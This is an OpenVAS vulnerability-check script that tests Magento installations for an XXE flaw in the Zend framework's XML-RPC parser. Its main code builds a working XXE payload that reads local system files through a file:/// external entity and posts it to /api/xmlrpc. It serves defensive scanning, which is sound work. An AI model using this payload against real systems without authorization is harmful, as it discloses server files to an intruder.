###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_magento_lfi_16_07_2012.nasl 11855 2018-10-12 07:34:51Z cfischer $
#
# Magento eCommerce Local File Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:magentocommerce:magento';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103518");
  script_version("$Revision: 11855 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Magento eCommerce Local File Disclosure");

  script_xref(name:"URL", value:"http://bot24.blogspot.de/2012/07/sec-consult-sa-20120712-0-magento.html");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/blog/comments/update-zend-framework-vulnerability-security-update/");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/download");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.0.0-1.4.1.1.patch");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.2.0.patch");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.5.0.0-1.7.0.1.patch");
  script_xref(name:"URL", value:"https://www.magentocommerce.com/products/customer/account/index/");

  script_tag(name:"summary", value:"Magento eCommerce platform uses a vulnerable version of Zend framework which
 is prone to XML eXternal Entity Injection attacks. The SimpleXMLElement class of
 Zend framework (SimpleXML PHP extension) is used in an insecure way to parse
 XML data. External entities can be specified by adding a specific DOCTYPE
 element to XML-RPC requests. By exploiting this vulnerability an application
 may be coerced to open arbitrary files and/or TCP connections.");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 09:34:51 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-07-16 10:24:55 +0200 (Mon, 16 Jul 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("sw_magento_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("magento/installed");

  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

host = get_host_name();

files = traversal_files();

url = dir + '/api/xmlrpc';

foreach file (keys(files)) {

 ex = '<?xml version="1.0"?>
   <!DOCTYPE foo [
   <!ELEMENT methodName ANY >
   <!ENTITY xxe SYSTEM "file:///' + files[file]  + '" >]>
  <methodCall>
    <methodName>&xxe;</methodName>
  </methodCall>';

  len = strlen(ex);

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Length: ", strlen(ex),
               "\r\n\r\n",
               ex);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(egrep(pattern:file, string:result)) {
    security_message(port:port);
    exit(0);
  }
}

exit( 99 );
